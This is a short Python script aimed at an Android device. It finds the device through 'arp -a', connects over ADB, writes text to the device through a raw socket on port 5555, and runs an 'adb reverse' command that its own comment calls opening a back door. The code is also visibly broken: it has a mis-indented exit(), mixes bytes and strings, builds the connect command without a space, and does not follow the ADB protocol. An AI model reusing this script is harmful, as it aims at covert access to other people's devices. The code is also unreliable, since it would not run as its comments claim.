#!/usr/bin/env python3

import os
import subprocess
import socket
import os

#asking for access token
access_token = input("Please enter your access token: ")

#checking if access token is valid
valid_token = os.environ.get('VALID_TOKEN')
if access_token != valid_token:
    print("Invalid Access Token")
        exit()

#finding the device IP address
output = subprocess.check_output(['arp', '-a'])
for line in output.splitlines():
    if 'Android' in line:
        device_IP = line.split()[1]
        break

#establishing a connection between the device and the host
adb_command = "adb connect"+device_IP
os.system(adb_command)

#checking if the connection is successful
output = subprocess.check_output(['adb', 'devices'])
if device_IP in output:
    print("Connection Successful")

#opening a TCP/IP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((device_IP, 5555))

#sending commands to the device
s.send("shell input text 'Hello World'".encode())

#opening a back door connection
backdoor_command = "adb reverse tcp:4444 tcp:5555"
os.system(backdoor_command)

#closing the socket connection
s.close()
